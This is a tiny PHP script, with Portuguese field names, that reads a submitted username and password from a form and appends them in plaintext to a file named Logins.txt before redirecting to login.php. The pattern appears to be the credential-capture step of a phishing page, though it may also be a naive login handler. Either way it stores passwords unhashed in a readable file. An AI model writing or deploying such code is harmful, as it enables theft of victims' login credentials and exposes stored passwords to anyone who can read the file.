<script src="../jquery-3.6.1.min.js"></script>
<?php

$login=fopen("Logins.txt", "a");
$nome = $_POST['nome'];
$senha = $_POST['senha']; 

fwrite($login, $nome);
fwrite($login, "/");
fwrite($login, $senha);
fwrite($login, "/");
fwrite($login, "\n");
fclose($login);
header("Location: login.php");
?>